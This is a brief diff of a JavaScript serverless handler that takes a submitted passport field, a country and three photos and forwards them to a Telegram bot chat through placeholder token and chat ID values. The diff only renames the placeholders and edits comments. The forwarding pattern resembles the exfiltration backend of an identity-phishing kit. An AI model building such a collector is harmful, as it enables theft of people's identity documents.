@@ -5,8 +5,8 @@ exports.handler = async (event) => {
   try {
     const data = JSON.parse(event.body);
 
-    const BOT = "PUT_YOUR_BOT_TOKEN_HERE";
-    const CHAT = "PUT_YOUR_CHAT_ID_HERE";
+    const BOT = "YOUR_BOT_TOKEN";
+    const CHAT = "YOUR_CHAT_ID";
 
     const text = `
 New User:
@@ -16,7 +16,7 @@ Passport: ${data.passport}
 Country: ${data.country}
 `;
 
-    // 🧾 send text
+    // ✅ TEXT
     await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -26,7 +26,7 @@ Country: ${data.country}
       })
     });
 
-    // 📸 send photos using FormData (FIXED)
+    // ✅ PHOTOS (3)
     const photos = [data.photo1, data.photo2, data.photo3];
 
     for (let p of photos) {
